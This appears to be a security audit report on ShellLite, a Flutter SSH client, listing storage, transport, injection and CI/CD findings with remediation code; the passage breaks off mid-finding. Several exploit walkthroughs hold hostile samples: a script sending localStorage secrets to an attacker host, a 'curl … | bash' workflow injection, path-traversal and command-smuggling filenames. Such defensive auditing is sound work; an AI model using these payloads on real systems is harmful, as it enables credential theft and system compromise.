# ShellLite Security Audit & Vulnerability Assessment Report

**Target Application**: ShellLite (Flutter SSH Client & Terminal Emulator)  
**Target Version**: `1.0.1+2`  
**Evaluation Dates**: September 2026  
**Auditor**: Technical Writer & Security Remediation Engineering Team  
**Classification**: Official Security Document / TLP:CLEAR  
**Target File**: `/home/aron/projects/ShellLite/SECURITY_AUDIT_REPORT.md`  

---

## 1. Executive Summary & Security Posture Evaluation

### 1.1 Executive Summary
ShellLite is a cross-platform SSH client and terminal emulator developed in Flutter, targeting Android, iOS, and Web environments. A comprehensive, adversarial security assessment was conducted across five core architectural domains:

1. **Cryptography & Key Management**: Key pair generation, parsing, PEM encoding/decoding, passphrase handling, and entropy sources.
2. **Credential Storage & Data-at-Rest**: Persistence of passwords, private keys, and passphrases across mobile hardware keystores and web browser runtimes.
3. **Network Transport & SSH Protocol**: Socket factories, transport encryption, WebSocket tunneling, host key verification, and background telemetry polling.
4. **Input Sanitization & Command Execution**: File transfer mechanics (SFTP and shell fallback), clipboard parsing, remote command escaping, and UI inputs.
5. **Repository, CI/CD & Dependencies**: GitHub Actions workflows, supply chain pinning, secrets inheritance, runner residue, and third-party dependencies.

The assessment identified **31 distinct security findings**:
- **2 Critical** severity vulnerabilities
- **4 High** severity vulnerabilities
- **13 Medium** severity vulnerabilities
- **9 Low** severity vulnerabilities
- **3 Informational** findings

Additionally, the assessment rigorously validated **21 potential security concerns as false positives or verified safe components**, confirming where ShellLite relies on sound architectural foundations.

---

### 1.2 Comprehensive Security Posture Evaluation

#### 1.2.1 Mobile vs. Web Security Boundaries
The security architecture of ShellLite exhibits a severe bifurcation between its native mobile implementations (Android, iOS) and its Web deployment:
- **Mobile Environment**: Enjoys strong operating system-enforced sandboxing, hardware-backed cryptographic modules (Android KeyStore via TEE/StrongBox, iOS Keychain via the Secure Enclave), and direct POSIX TCP socket connectivity. While minor configuration deficiencies were discovered (such as sub-optimal iOS Keychain accessibility attributes and disabled Android EncryptedSharedPreferences), the native boundary provides robust defense-in-depth against local privilege escalation and offline data extraction.
- **Web Environment**: Flutter Web operates entirely within the untrusted boundary of the browser DOM and JavaScript virtual machine. Browsers disallow raw TCP socket creation, requiring ShellLite to bridge SSH traffic through a WebSocket proxy (`websockify`). Crucially, the web implementation completely bypassed cryptographic storage, writing passwords and unencrypted SSH private keys directly into `window.localStorage` encoded merely with Base64 (`lib/services/storage_service.dart:74-145`). Any Cross-Site Scripting (XSS) vulnerability, malicious browser extension with storage access, or unauthorized physical terminal access results in immediate, catastrophic key compromise.

#### 1.2.2 Hardware Keystores vs. Browser LocalStorage
On Android and iOS, `StorageService` delegates to `flutter_secure_storage`. However, on the Web, the code path explicitly diverges:
```dart
if (kIsWeb) {
  final prefs = await _sharedPrefs;
  final encoded = base64Encode(utf8.encode(value));
  await prefs.setString('$_webCredPrefix$tag', encoded);
  return;
}
```
`shared_preferences` on Flutter Web maps to HTML5 `localStorage`. Base64 encoding is an encoding scheme, not an encryption cipher; it provides zero confidentiality. The disparity means that while a mobile device requires hardware exploitation or physical unlock under AFU (After First Unlock) states to harvest credentials, a web browser user loses all credentials if an attacker executes arbitrary JavaScript or inspects browser storage.

#### 1.2.3 SSH Transport Assumptions vs. Actual Implementation
RFC 4251 (The Secure Shell Architecture) dictates that an SSH client MUST verify the authenticity of the server's public host key prior to transmitting user credentials or establishing secure sessions. In ShellLite, **host key verification is entirely absent** across both interactive SSH sessions (`lib/services/ssh_service.dart:101-110`) and automated telemetry probes (`lib/services/telemetry_service.dart:60-68`). 

The `dartssh2` library client constructor accepts an optional `onVerifyHostKey` callback; when omitted, `dartssh2` defaults to accepting any host key unconditionally. Consequently:
- Any network adversary in a Man-in-the-Middle position (compromised public Wi-Fi, DNS poisoning, ARP spoofing, rogue gateway, or compromised WebSocket bridge proxy) can impersonate the remote server.
- The client seamlessly transmits the user's password or authenticates using private key signatures without warning.
- Compounding this, the `TelemetryService` triggers automated, background SSH connections upon rendering server cards (`lib/widgets/server_card.dart:33-41`), causing zero-click background credential transmission to spoofed hosts.

---

### 1.3 Risk Distribution & Severity Breakdown

```
       CRITICAL: [██] 2 (6.5%)
           HIGH: [████] 4 (12.9%)
         MEDIUM: [█████████████] 13 (41.9%)
            LOW: [█████████] 9 (29.0%)
  INFORMATIONAL: [███] 3 (9.7%)
  TOTAL VERIFIED FINDINGS: 31
```

#### Breakdown by Domain

| Security Domain | Critical | High | Medium | Low | Info | Total |
|---|:---:|:---:|:---:|:---:|:---:|:---:|
| **Credential Storage & Data-at-Rest** | 1 | 0 | 3 | 2 | 0 | **6** |
| **Network Transport & Protocol** | 1 | 2 | 2 | 1 | 0 | **6** |
| **Input Sanitization & Command Injection** | 0 | 1 | 1 | 2 | 0 | **4** |
| **Cryptography & Keys** | 0 | 0 | 4 | 2 | 0 | **6** |
| **Repository, CI/CD & Dependencies** | 0 | 1 | 3 | 2 | 3 | **9** |
| **Total** | **2** | **4** | **13** | **9** | **3** | **31** |

---

## 2. Master Findings Summary Table

| Finding ID | Title | Severity | CVSS v3.1 | OWASP Mobile (2024) | Affected Component |
|---|---|:---:|:---:|:---:|---|
| **SEC-STORAGE-01** | Cleartext Base64 Insecure Storage of SSH Private Keys & Passwords in Web Browser LocalStorage | **Critical** | **9.6** | M9: Insecure Data Storage | `lib/services/storage_service.dart:74-145` |
| **SEC-NET-01** | Complete Absence of Server Host Key Verification (Blind Acceptance / MITM) | **Critical** | **8.7** | M5: Insecure Communication | `lib/services/ssh_service.dart:101-110`<br>`lib/services/telemetry_service.dart:60-68` |
| **SEC-INJECT-01** | Remote Arbitrary File Overwrite via Unsanitized Upload Filename (Path Traversal) | **High** | **8.1** | M4: Insufficient Input/Output Validation | `lib/services/file_transfer_service.dart:206, 278` |
| **SEC-CICD-01** | Command / Shell Injection via Inline Expression Interpolation in Release Workflow | **High** | **7.9** | M8: Security Misconfiguration | `.github/workflows/release.yml:43-46`<br>`scripts/resolve_version.sh:169-172` |
| **SEC-NET-03** | Zero-Click Background Credential Transmission & Host Key Bypass via TelemetryService | **High** | **7.1** | M5: Insecure Communication<br>M8: Security Misconfiguration | `lib/widgets/server_card.dart:33-41`<br>`lib/services/telemetry_service.dart:30-75` |
| **SEC-NET-02** | Insecure Cleartext WebSocket Transport Downgrade (`ws://`) and Routing Failure on Web | **High** | **6.8** | M5: Insecure Communication | `lib/services/ssh_socket_factory.dart:14-19` |
| **SEC-INJECT-02** | Shell Escaping Incompatibility Leading to Command Injection on Windows OpenSSH Remote Hosts | **Medium** | **7.1** | M4: Insufficient Input/Output Validation | `lib/services/file_transfer_service.dart:207, 213, 224` |
| **SEC-CICD-02** | Third-Party Actions Not Pinned to Full Commit SHAs (Supply Chain Risk) | **Medium** | **6.8** | M2: Inadequate Supply Chain Security | `.github/workflows/ci.yml`<br>`build-android.yml`<br>`build-ios.yml`<br>`release.yml` |
| **SEC-CRYPTO-01** | Blind Catch-All Exception Swallowing Masks Malformed/Unsupported Keys as Incorrect Passphrase | **Medium** | **6.5** | M10: Insufficient Cryptography | `lib/services/key_parser.dart:68-72` |
| **SEC-STORAGE-02** | Missing AndroidX EncryptedSharedPreferences and StrongBox KeyStore Configuration | **Medium** | **6.2** | M9: Insecure Data Storage<br>M1: Improper Credential Usage | `lib/services/storage_service.dart:19-24` |
| **SEC-CICD-03** | Bypassing Gradle Dependency Verification via `--android-skip-build-dependency-validation` | **Medium** | **5.9** | M2: Inadequate Supply Chain Security | `.github/workflows/build-android.yml:69, 75` |
| **SEC-STORAGE-03** | Silent Exception Suppression in Secure Storage Operations Leading to Orphaned Secrets and Data Loss | **Medium** | **5.9** | M9: Insecure Data Storage<br>M10: Insufficient Cryptography | `lib/services/storage_service.dart:88-95, 129-145`<br>`lib/providers/server_store.dart:86-97` |
| **SEC-CRYPTO-03** | Flawed Global Substring Search in `isEncrypted` Causes Denial of Service on Unencrypted Keys | **Medium** | **5.5** | M10: Insufficient Cryptography | `lib/services/key_parser.dart:33-43` |
| **SEC-CRYPTO-05** | Generated SSH Private Keys Lack Passphrase Protection and Are Exposed Plaintext in UI | **Medium** | **5.5** | M9: Insecure Data Storage<br>M10: Insufficient Cryptography | `lib/services/key_generator_service.dart:24-65`<br>`lib/screens/server_form_screen.dart:150-160` |
| **SEC-STORAGE-04** | Indefinite In-Memory Credential Retention and Eager Telemetry Fetching | **Medium** | **5.5** | M9: Insecure Data Storage<br>M1: Improper Credential Usage | `lib/services/storage_service.dart:30`<br>`lib/screens/server_list_screen.dart:94-103` |
| **SEC-CICD-04** | Keystore Credential Residue on Self-Hosted Runners and Secrets Inheritance on PRs | **Medium** | **5.5** | M8: Security Misconfiguration | `.github/workflows/build-android.yml:23, 50-64`<br>`.github/workflows/ci.yml:57` |
| **SEC-NET-04** | Broadcast Stream Race Condition Causing Silent Packet Loss in WebSocketSSHSocket | **Medium** | **5.3** | M8: Security Misconfiguration | `lib/services/web_ssh_socket.dart:10, 16-37, 56` |
| **SEC-NET-05** | Half-Close Resource Leakage, Unhandled Stream Errors & Silent Text Frame Dropping in WebSocketSSHSocket | **Medium** | **5.3** | M8: Security Misconfiguration | `lib/services/web_ssh_socket.dart:18-25, 39-46, 65-73` |
| **SEC-CRYPTO-04** | Lack of Sensitive Memory Zeroization and Prolonged Credential Retention in VM Garbage Collection Heap | **Medium** | **4.7** | M9: Insecure Data Storage<br>M10: Insufficient Cryptography | `lib/services/key_generator_service.dart:26-53`<br>`lib/services/storage_service.dart:30` |
| **SEC-INJECT-03** | Shell Tilde Expansion Invalidation in Remote Upload Directory Resolution | **Low** | **4.6** | M4: Insufficient Input/Output Validation | `lib/services/file_transfer_service.dart:197-207, 213` |
| **SEC-NET-06** | Dangling Asynchronous Socket Execution & Server Connection Flooding in TelemetryService | **Low** | **4.3** | M8: Security Misconfiguration | `lib/services/telemetry_service.dart:20-26`<br>`lib/screens/server_list_screen.dart:98-102` |
| **SEC-STORAGE-06** | Sub-optimal iOS Keychain Accessibility Setting Exposing Secrets During Device Lock (AFU State) | **Low** | **4.2** | M9: Insecure Data Storage | `lib/services/storage_service.dart:16` |
| **SEC-CRYPTO-02** | Sensitive Parsing Details Leaked in UI and Debug Logs via Unsanitized Exception Formatting | **Low** | **3.3** | M10: Insufficient Cryptography | `lib/services/key_parser.dart:82-84`<br>`lib/screens/server_form_screen.dart:132, 830` |
| **SEC-INJECT-04** | Unanchored & Permissive Clipboard Parsing Causing Target Misconfiguration & Option Confusion | **Low** | **3.3** | M4: Insufficient Input/Output Validation | `lib/screens/server_form_screen.dart:274-282` |
| **SEC-STORAGE-05** | Incomplete Credential Cleanup on Profile Update / Deletion (Passphrase Tag Residue) | **Low** | **3.3** | M9: Insecure Data Storage | `lib/providers/server_store.dart:86-97` |
| **SEC-REPO-01** | Historical Commit Secret Residue - Deleted Live SSH Test File Retained in Commit Graph | **Low** | **3.3** | M8: Security Misconfiguration | Git history `38b48a0`, `8281d64` |
| **SEC-CRYPTO-06** | Unsanitized Public Key Comment Parameter Permits Multiline Injection in `authorized_keys` | **Low** | **3.1** | M7: Client-Side Injection | `lib/services/key_generator_service.dart:36, 46` |
| **SEC-CICD-05** | Excessive Top-Level Permissions Violating Principle of Least Privilege | **Low** | **2.0** | M8: Security Misconfiguration | `.github/workflows/release.yml:23-24`<br>`dependabot-auto-merge.yml:8-10` |
| **SEC-CICD-06** | Unauthenticated Dependabot PR Auto-Merge Without Semver Validation on Manual Dispatch | **Low** | **2.0** | M2: Inadequate Supply Chain Security | `.github/workflows/dependabot-auto-merge.yml:35-48` |
| **SEC-DEP-01** | Legacy Transitive Dependency `zmodem` (0.0.6) and Zero-Major Caret Ranges | **Info** | **3.7** | M2: Inadequate Supply Chain Security | `pubspec.lock:736-743`<br>`pubspec.yaml:19` |
| **SEC-STATIC-01** | Static Analysis Lacks `--fatal-infos` Flag in CI Workflow | **Info** | **0.0** | M8: Security Misconfiguration | `.github/workflows/ci.yml:30` |

---

## 3. Comprehensive Detailed Findings Breakdown

### SEC-STORAGE-01: Cleartext Base64 Insecure Storage of SSH Private Keys & Passwords in Web Browser LocalStorage
- **Severity**: **Critical**
- **CVSS v3.1 Score**: **9.6** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`)
- **OWASP Mobile (2024)**: M9: Insecure Data Storage
- **CWE**: CWE-312: Cleartext Storage of Sensitive Information, CWE-922: Insecure Storage of Sensitive Information
- **Affected Component**: `lib/services/storage_service.dart:74-145`

#### Vulnerability Description & Root Cause
In `StorageService`, credential storage operations branch on `kIsWeb`. In web builds, instead of encrypting credentials or leveraging modern browser Web Cryptography APIs (e.g. `SubtleCrypto` with user-derived PBKDF2 keys or IndexedDB with session-bound ephemeral keys), the service stores credentials in `SharedPreferences`:
```dart
static const _webCredPrefix = 'shell_lite_wc_';

Future<void> saveCredential(String tag, String value) async {
  _inMemoryCredentials[tag] = value;
  if (kIsWeb) {
    final prefs = await _sharedPrefs;
    final encoded = base64Encode(utf8.encode(value));
    await prefs.setString('$_webCredPrefix$tag', encoded);
    return;
  }
  // ...
}
```
In Flutter Web, `SharedPreferences` writes to the browser's HTML5 `window.localStorage`. Base64 encoding provides zero confidentiality.

#### Exploit / Threat Mechanics
1. An attacker identifies any Cross-Site Scripting (XSS) vulnerability or injects a malicious third-party script/CDN asset into the web host.
2. The injected script executes:
   ```javascript
   for (let i = 0; i < localStorage.length; i++) {
     const key = localStorage.key(i);
     if (key.startsWith('flutter.shell_lite_wc_')) {
       const b64 = localStorage.getItem(key);
       const secret = atob(b64);
       fetch('https://attacker-c2.com/exfil?k=' + encodeURIComponent(key) + '&s=' + encodeURIComponent(secret));
     }
   }
   ```
3. Alternatively, any user on a shared workstation, or any browser extension with `<all_urls>` storage permissions, accesses `localStorage` directly and retrieves production SSH private keys and root passwords in cleartext.

#### Impact Assessment
- **Confidentiality**: Catastrophic. Full loss of all stored server passwords and private keys.
- **Integrity**: High. Attackers obtain remote root access to all servers managed by the user.
- **Availability**: Unaffected directly, but compromised servers can be destroyed.

#### Concrete Remediation Guidance
On Flutter Web, persistent unencrypted storage of raw credentials in `localStorage` must be eliminated. If persistence across browser restarts is required, credentials must be encrypted using WebCrypto AES-GCM with a user-supplied Master Passphrase derived via PBKDF2/Argon2. In the "Lite" model, web builds should default to strictly ephemeral in-memory credential storage during the active browser session, warning users that credentials are not persisted across page reloads.

```dart
// Remediation: lib/services/storage_service.dart
Future<void> saveCredential(String tag, String value) async {
  _inMemoryCredentials[tag] = value;
  if (kIsWeb) {
    // In web mode, NEVER write cleartext/base64 credentials to localStorage.
    // Retain only in memory for the active session, or require explicit user-master-key encryption.
    debugPrint('StorageService: Web credential held in ephemeral session memory only.');
    return;
  }
  try {
    await _secureStorage.write(key: tag, value: value).timeout(storageTimeout);
  } catch (e) {
    throw StorageException('Failed to securely store credential: $e');
  }
}
```

---

### SEC-NET-01: Complete Absence of Server Host Key Verification (Blind Acceptance / MITM)
- **Severity**: **Critical**
- **CVSS v3.1 Score**: **8.7** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`)
- **OWASP Mobile (2024)**: M5: Insecure Communication
- **CWE**: CWE-295: Improper Certificate/Key Validation, CWE-300: Channel Accessible by Non-Endpoint
- **Affected Component**: 
  - `lib/services/ssh_service.dart:101-110`
  - `lib/services/telemetry_service.dart:60-68`

#### Vulnerability Description & Root Cause
In `SSHService._connect()` and `TelemetryService._fetchWithTimeout()`, an `SSHClient` instance is initialized using `dartssh2`:
```dart
_client = SSHClient(
  socket,
  username: profile.username,
  onPasswordRequest: password != null ? () => password! : null,
  onUserInfoRequest: password != null
      ? (request) => request.prompts.map((_) => password!).toList()
      : null,
  identities: keyPairs,
  keepAliveInterval: SSHConfig.keepAliveInterval,
);
```
Neither service provides the `onVerifyHostKey` callback. Under `dartssh2`, when `onVerifyHostKey` is `null`, the client accepts whatever host key the server sends during key exchange without validation.

#### Exploit / Threat Mechanics
1. A victim connects to their remote server via ShellLite while connected to an untrusted local network (e.g., airport Wi-Fi, coffee shop, or via an adversary with ARP/DNS spoofing capability).
2. The adversary intercepts port 22 (or the WebSocket bridge connection on web) and terminates the SSH connection using an arbitrary host key generated by the attacker.
3. ShellLite proceeds with authentication without presenting any host key warning or verification prompt to the user.
4. ShellLite sends the user's plain password via `onPasswordRequest`, or performs signature challenges with the user's private key.
5. The attacker captures the cleartext password and relays the connection to the legitimate destination or executes arbitrary commands.

#### Impact Assessment
- **Confidentiality**: Critical. Attackers intercept cleartext SSH passwords, session tokens, and sensitive terminal I/O.
- **Integrity**: Critical. Attackers can inject arbitrary commands into the session undetected.
- **Availability**: Moderate. MITM attacker can sever connections at will.

#### Concrete Remediation Guidance
Implement a strict `KnownHostsManager` storing SHA-256 host key fingerprints in secure storage, following the Trust On First Use (TOFU) model:
1. Store host key fingerprints: `known_hosts_<host>_<port>`.
2. Provide `onVerifyHostKey: (type, fingerprint) => verifyHostKey(profile, type, fingerprint)`.
3. If the host key matches, proceed. If unknown, prompt the user with the fingerprint (or auto-accept on first connection if TOFU is configured, but alert if changed). If the fingerprint has changed, **abort the connection immediately with an explicit MITM security warning**.

```dart
// Remediation: lib/services/ssh_service.dart
bool Function(String type, Uint8List fingerprint) _buildHostKeyVerifier(ServerProfile profile) {
  return (String type, Uint8List fingerprint) {
    final hexFingerprint = sha256.convert(fingerprint).toString();
    final knownFingerprint = _knownHostsService.getFingerprint(profile.host, profile.port);

    if (knownFingerprint == null) {
      // TOFU: First time seeing this host
      _knownHostsService.saveFingerprint(profile.host, profile.port, hexFingerprint);
      return true;
    }
    if (knownFingerprint != hexFingerprint) {
      debugPrint('CRITICAL: Host key mismatch for ${profile.host}! Possible MITM attack!');
      return false; // Rejects connection and aborts key exchange
    }
    return true;
  };
}
```

---

### SEC-INJECT-01: Remote Arbitrary File Overwrite via Unsanitized Upload Filename (Path Traversal)
- **Severity**: **High**
- **CVSS v3.1 Score**: **8.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **OWASP Mobile (2024)**: M4: Insufficient Input/Output Validation
- **CWE**: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **Affected Component**: `lib/services/file_transfer_service.dart:206, 278`

#### Vulnerability Description & Root Cause
In `FileTransferService`, both shell-based upload (`_uploadViaCat`) and SFTP-based upload (`_uploadViaSftp`) construct the remote target path by concatenating the remote directory with `item.name`:
```dart
// Line 206 (_uploadViaCat)
final remotePath = targetDir == '/' ? '/${item.name}' : '$targetDir/${item.name}';
final escapedPath = remotePath.replaceAll("'", "'\\''");
final session = await client.execute("cat > '$escapedPath'");

// Line 278 (_uploadViaSftp)
final remotePath = targetDir == '/' ? '/${item.name}' : '$targetDir/${item.name}';
final remoteFile = await sftp.open(
  remotePath,
  mode: SftpFileOpenMode.create | SftpFileOpenMode.write | SftpFileOpenMode.truncate,
);
```
Neither method validates or sanitizes `item.name`. If `item.name` contains directory traversal sequences (such as `../../../../root/.ssh/authorized_keys` or `/etc/cron.d/backdoor`), the constructed path escapes the intended directory.

#### Exploit / Threat Mechanics
1. An attacker tricks a user into selecting a file with a crafted filename (or a malicious local file provider or shared download directory injects a file named `../../../../etc/shadow` or `../../.ssh/authorized_keys`).
2. The user initiates an upload targeting `/tmp` or `~/uploads`.
3. `remotePath` evaluates to `/tmp/../../root/.ssh/authorized_keys` which resolves to `/root/.ssh/authorized_keys`.
4. `cat > '/tmp/../../root/.ssh/authorized_keys'` or `sftp.open` overwrites the root authorized keys file, granting the attacker persistent root access.

#### Impact Assessment
- **Integrity**: Critical. Arbitrary file creation/overwrite on the remote host with the privileges of the connected SSH user.
- **Confidentiality**: High. Can overwrite configurations, scripts, or cron jobs to achieve remote code execution.

#### Concrete Remediation Guidance
Sanitize `item.name` to strip all path components, directory separators (`/` and `\`), and relative navigation tokens (`.` and `..`):

```dart
// Remediation: lib/services/file_transfer_service.dart
static String sanitizeFileName(String fileName) {
  // Strip any leading directory paths (handles both POSIX and Windows separators)
  var name = fileName.split('/').last.split(r'\').last.trim();
  // Remove null bytes and path traversal sequences
  name = name.replaceAll('\x00', '').replaceAll('..', '');
  if (name.isEmpty || name == '.' || name == '..') {
    return 'unnamed_upload_${DateTime.now().millisecondsSinceEpoch}';
  }
  return name;
}
```

---

### SEC-CICD-01: Command / Shell Injection via Inline Expression Interpolation in Release Workflow
- **Severity**: **High**
- **CVSS v3.1 Score**: **7.9** (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N`)
- **OWASP Mobile (2024)**: M8: Security Misconfiguration
- **CWE**: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **Affected Component**: 
  - `.github/workflows/release.yml:43-46`
  - `scripts/resolve_version.sh:169-172`

#### Vulnerability Description & Root Cause
In `.github/workflows/release.yml`:
```yaml
- name: Resolve Version & Tag
  id: versioning
  run: |
    chmod +x scripts/resolve_version.sh
    ./scripts/resolve_version.sh "${{ inputs.bump_type || 'auto' }}" "${{ inputs.custom_version || '' }}"
```
GitHub Actions evaluates `${{ ... }}` expressions before generating the temporary shell script executed by the runner. If an input containing shell metacharacters is supplied, it breaks out of the quotes.

Additionally, in `scripts/resolve_version.sh`:
```bash
echo "changelog<<EOF" >> "$GITHUB_OUTPUT"
echo "$CHANGELOG" >> "$GITHUB_OUTPUT"
echo "EOF" >> "$GITHUB_OUTPUT"
```
The script uses a static `EOF` heredoc delimiter when writing `$CHANGELOG` to `$GITHUB_OUTPUT`. If a git commit message contains `EOF` on a single line followed by malicious GitHub Actions commands (e.g. `::set-output` or environment overrides), the delimiter is closed prematurely.

#### Exploit / Threat Mechanics
1. A user with workflow dispatch permission runs `release.yml` with:
   - `custom_version`: `1.0.0" ; curl https://attacker.com/malware.sh | bash ; echo "`
2. GitHub Actions generates a runner script:
   ```bash
   ./scripts/resolve_version.sh "custom" "1.0.0" ; curl https://attacker.com/malware.sh | bash ; echo ""
   ```
3. The injected command executes on the GitHub Actions runner, exposing repository secrets (signing keystores, App Store tokens, `GITHUB_TOKEN`).
4. In commit log injection, an untrusted PR commit message containing:
   ```text
   feat: test
   EOF
   should_release=true
   tag=v99.99.99
   ```
   hijacks pipeline outputs.

#### Impact Assessment
- **Confidentiality/Integrity**: High. Full compromise of CI runner environment, leakage of code-signing certificates and automated release tagging.

#### Concrete Remediation Guidance
Pass inputs via environment variables instead of inline template interpolation, and use a cryptographic UUID for GitHub output delimiters:

```yaml
# Remediation: .github/workflows/release.yml
- name: Resolve Version & Tag
  id: versioning
  env:
    BUMP_TYPE: ${{ inputs.bump_type || 'auto' }}
    CUSTOM_VERSION: ${{ inputs.custom_version || '' }}
  run: |
    chmod +x scripts/resolve_version.sh
    ./scripts/resolve_version.sh "$BUMP_TYPE" "$CUSTOM_VERSION"
```

```bash
# Remediation: scripts/resolve_version.sh
DELIMITER="EOF_$(cat /proc/sys/kernel/random/uuid 2>/dev/null || openssl rand -hex 16)"
echo "changelog<<$DELIMITER" >> "$GITHUB_OUTPUT"
echo "$CHANGELOG" >> "$GITHUB_OUTPUT"
echo "$DELIMITER" >> "$GITHUB_OUTPUT"
```

---

### SEC-NET-03: Zero-Click Background Credential Transmission & Host Key Bypass via TelemetryService
- **Severity**: **High**
- **CVSS v3.1 Score**: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M5: Insecure Communication, M8: Security Misconfiguration
- **CWE**: CWE-319: Cleartext Transmission of Sensitive Information, CWE-862: Missing Authorization
- **Affected Component**: 
  - `lib/widgets/server_card.dart:33-41`
  - `lib/services/telemetry_service.dart:30-75`

#### Vulnerability Description & Root Cause
When the server list is loaded, `ServerCard.build()` executes:
```dart
if (telemetry == null &&
    !isLoadingTelemetry &&
    telemetryStore != null &&
    !telemetryStore.hasAttempted(profile.id)) {
  WidgetsBinding.instance.addPostFrameCallback((_) {
    telemetryStore.refresh(profile);
  });
}
```
Rendering the server card triggers an automated SSH connection in the background via `TelemetryService.fetchTelemetry(profile)`. `TelemetryService` retrieves the user's password or private key from storage and establishes an SSH session with host key verification disabled (SEC-NET-01).

#### Exploit / Threat Mechanics
1. An attacker imports a server profile into the app (or a user connects to a public network where an existing server hostname/IP is spoofed).
2. As soon as the user opens ShellLite and looks at the server list, the app automatically connects to the server IP and authenticates.
3. The user has not clicked or authorized any connection. If the network is hostile or the server profile points to an attacker-controlled endpoint, credentials are leaked immediately upon app launch without user interaction.

#### Impact Assessment
- **Confidentiality**: High. Credentials transmitted without explicit user consent or confirmation.
- **Privacy**: High. Network observers observe background pings to all saved server endpoints.

#### Concrete Remediation Guidance
1. Disable automatic zero-click background telemetry polling by default.
2. Require an explicit user toggle in settings ("Enable Server Card Telemetry").
3. Only execute telemetry requests when host key verification passes and the server has been verified at least once in an interactive session.

---

### SEC-NET-02: Insecure Cleartext WebSocket Transport Downgrade (`ws://`) and Routing Failure on Web
- **Severity**: **High**
- **CVSS v3.1 Score**: **6.8** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M5: Insecure Communication
- **CWE**: CWE-319: Cleartext Transmission of Sensitive Information, CWE-326: Inadequate Encryption Strength
- **Affected Component**: `lib/services/ssh_socket_factory.dart:14-19`

#### Vulnerability Description & Root Cause
In `SSHSocketFactory.connect()`:
```dart
if (kIsWeb) {
  final scheme = Uri.base.scheme == 'http' ? 'ws' : 'wss';
  final wsHost = Uri.base.host.isNotEmpty ? Uri.base.host : host;
  final portSuffix = Uri.base.hasPort ? ':${Uri.base.port}' : '';
  final wsUri = Uri.parse('$scheme://$wsHost$portSuffix/ssh-ws');
  return WebSocketSSHSocket.connect(wsUri);
}
```
If ShellLite web is loaded over HTTP (e.g., in a LAN or staging environment), `scheme` downgrades to `ws://`. Under `ws://`, the entire SSH transport session (which lacks host key verification due to SEC-NET-01) is tunneled over cleartext WebSocket frames, exposing it to inspection and tampering.

Furthermore, `wsUri` hardcodes `/ssh-ws` without conveying the intended destination `host` or `port` (`/ssh-ws?targetHost=$host&targetPort=$port`), causing routing failure or routing all outbound sessions to whatever default upstream server the reverse proxy configured.

#### Exploit / Threat Mechanics
1. A user loads the web client over an internal network `http://shell.internal/`.
2. The socket factory initiates a cleartext `ws://` WebSocket connection.
3. Network intermediaries inspect the raw WebSocket frames or hijack the session before SSH protocol handshake completes.

#### Impact Assessment
- **Confidentiality/Integrity**: High on unencrypted HTTP web sessions.
- **Functionality**: Multi-server routing fails if proxy does not know target destination.

#### Concrete Remediation Guidance
Enforce `wss://` exclusively, and pass target host and port as query parameters:

```dart
// Remediation: lib/services/ssh_socket_factory.dart
if (kIsWeb) {
  // Always enforce wss:// unless connecting to explicit localhost development
  final isLocal = Uri.base.host == 'localhost' || Uri.base.host == '127.0.0.1';
  final scheme = (Uri.base.scheme == 'http' && isLocal) ? 'ws' : 'wss';
  final wsHost = Uri.base.host.isNotEmpty ? Uri.base.host : 'localhost';
  final portSuffix = Uri.base.hasPort ? ':${Uri.base.port}' : '';
  final wsUri = Uri.parse(
    '$scheme://$wsHost$portSuffix/ssh-ws?targetHost=${Uri.encodeComponent(host)}&targetPort=$port',
  );
  return WebSocketSSHSocket.connect(wsUri);
}
```

---

### SEC-INJECT-02: Shell Escaping Incompatibility Leading to Command Injection on Windows OpenSSH Remote Hosts
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **7.1** (`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **OWASP Mobile (2024)**: M4: Insufficient Input/Output Validation
- **CWE**: CWE-78: Improper Neutralization of Special Elements used in an OS Command
- **Affected Component**: `lib/services/file_transfer_service.dart:207, 213, 224`

#### Vulnerability Description & Root Cause
In `FileTransferService._uploadViaCat`:
```dart
final escapedPath = remotePath.replaceAll("'", "'\\''");
final session = await client.execute("cat > '$escapedPath'");
// ...
await client.execute("rm -f '$escapedPath'");
```
Single-quote wrapping (`'...'`) with POSIX escaping (`'\\''`) is strictly a POSIX shell convention (sh, bash, zsh). When connecting to a Windows host running Microsoft OpenSSH where the default shell is `cmd.exe` or PowerShell:
- `cmd.exe` does not treat single quotes as string delimiters.
- Characters like `&`, `|`, `<`, `>`, `%` inside single quotes are parsed as command separators and operators in `cmd.exe`.

#### Exploit / Threat Mechanics
1. A file named `test'&calc.exe&'.txt` is uploaded to a Windows server via `cat` fallback.
2. The executed command becomes:
   `cat > 'C:/test''&calc.exe&''.txt'`
3. In `cmd.exe`, `& calc.exe &` executes `calc.exe` with the user's remote privileges.

#### Impact Assessment
- **Integrity/Confidentiality**: High. Remote code execution on Windows SSH endpoints when SFTP is unavailable and shell fallback is engaged.

#### Concrete Remediation Guidance
Prioritize pure SFTP file transfer over raw shell command execution. When shell fallback is unavoidable, validate that filenames contain only alphanumeric characters, dots, underscores, and dashes, or detect remote shell architecture before emitting POSIX shell syntax.

---

### SEC-CICD-02: Third-Party Actions Not Pinned to Full Commit SHAs (Supply Chain Risk)
- **Severity**: **Medium**
- **CVSS v3.1 Score**: **6.8** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N`)
- **OWASP Mobile (2024)**: M2: Inadequate Supply Chain Security
- **CWE**: CWE-829: Inclusion of Functionality from Untrusted Control Sphere
- **Affected Component**: `.github/workflows/ci.yml`, `build-android.yml`, `build-ios.yml`, `release.yml`

#### Vulnerability Description & Root Cause
Across all GitHub Actions workflows, third-party actions are referenced using mutable tags or version branches:
- `actions/checkout@v7` (Note: v7 does not exist yet; currently v4 is stable, pointing to potential failure or unpinned tag)
